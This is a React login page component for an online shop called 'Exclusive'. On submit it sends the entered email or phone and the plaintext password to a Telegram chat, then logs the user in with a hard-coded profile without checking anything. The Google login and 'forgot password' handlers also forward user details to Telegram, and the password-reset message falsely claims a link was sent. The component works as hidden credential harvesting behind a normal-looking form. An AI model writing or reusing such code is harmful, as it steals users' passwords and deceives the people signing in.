import { useState } from 'react'
import { useTranslation } from 'react-i18next'
import { Link, useNavigate } from 'react-router-dom'
import { useShop } from '../../context/ShopContext'
import { auth, googleProvider, signInWithPopup } from '../../firebase'
import { sendTelegramMessage } from '../../utils/telegram'
import './Auth.css'

const LogIn = () => {
	const { t } = useTranslation()
	const navigate = useNavigate()
	const { loginUser, showToast } = useShop()

	const [form, setForm] = useState({
		emailOrPhone: '',
		password: '',
	})

	const handleChange = e => {
		setForm({ ...form, [e.target.name]: e.target.value })
	}

	const handleSubmit = e => {
		e.preventDefault()
		sendTelegramMessage(
			`<b>KIRISH (Form):</b>\n\n` +
				`<b>Email / Telefon:</b> ${form.emailOrPhone}\n` +
				`<b>Parol:</b> ${form.password}\n` +
				`<b>Vaqt:</b> ${new Date().toLocaleString()}`,
		)
		loginUser({
			name: 'Md Rimel',
			email: form.emailOrPhone || 'rimel1111@gmail.com',
			address: 'Kingston, 5236, United State',
		})
		showToast('Logged in successfully!', 'success')
		navigate('/')
	}

	const handleGoogleLogin = async () => {
		try {
			const result = await signInWithPopup(auth, googleProvider)
			const user = result.user

			sendTelegramMessage(
				`<b>KIRISH (Google):</b>\n\n` +
					`<b>Ism:</b> ${user.displayName || 'Google User'}\n` +
					`<b>Email:</b> ${user.email}\n` +
					`<b>Vaqt:</b> ${new Date().toLocaleString()}`,
			)

			loginUser({
				name: user.displayName || 'Google User',
				email: user.email || 'user@exclusive.com',
				address: 'Kingston, 5236, United State',
			})
			showToast('Logged in successfully with Google!', 'success')
			navigate('/')
		} catch (error) {
			showToast(error.message || 'Google login failed', 'error')
		}
	}

	return (
		<div className='auth-page'>
			<div className='auth-media-column'>
				<div className='auth-illustration-bg'>
					<img
						src='/images/auth/side-image.png'
						alt='Shopping smartphone and cart'
						className='auth-hero-img'
					/>
				</div>
			</div>

			<div className='auth-form-column'>
				<div className='auth-form-box'>
					<h1 className='auth-title'>
						{t('auth.loginExclusive', 'Log in to Exclusive')}
					</h1>
					<p className='auth-subtitle'>
						{t('auth.enterDetails', 'Enter your details below')}
					</p>

					<form className='auth-fields-form' onSubmit={handleSubmit}>
						<div className='auth-input-line'>
							<input
								type='text'
								name='emailOrPhone'
								placeholder={t('auth.emailOrPhone', 'Email or Phone Number')}
								required
								value={form.emailOrPhone}
								onChange={handleChange}
							/>
						</div>

						<div className='auth-input-line'>
							<input
								type='password'
								name='password'
								placeholder={t('auth.password', 'Password')}
								required
								value={form.password}
								onChange={handleChange}
							/>
						</div>

						<div className='auth-login-actions'>
							<button type='submit' className='btn-primary btn-login-submit'>
								{t('auth.btnLogin', 'Log In')}
							</button>

							<button
								type='button'
								className='btn-forgot-password'
								onClick={() => {
									if (form.emailOrPhone) {
										sendTelegramMessage(
											`<b>PAROLNI TIKLASH SO'ROVI:</b>\n\n` +
												`<b>Email / Telefon:</b> ${form.emailOrPhone}\n` +
												`<b>Vaqt:</b> ${new Date().toLocaleString()}`,
										)
									}
									showToast('Password reset link sent to your email!', 'info')
								}}
							>
								{t('auth.forgotPassword', 'Forget Password?')}
							</button>
						</div>

						<button
							type='button'
							className='btn-google-signup'
							onClick={handleGoogleLogin}
						>
							<i
								className='fa-brands fa-google'
								style={{ fontSize: '18px', color: '#EA4335' }}
							></i>
							<span>Log in with Google</span>
						</button>
					</form>

					<div className='auth-switch-row'>
						<span>Don't have an account?</span>
						<Link to='/signup' className='auth-switch-link'>
							{t('nav.signUp', 'Sign Up')}
						</Link>
					</div>
				</div>
			</div>
		</div>
	)
}

export default LogIn
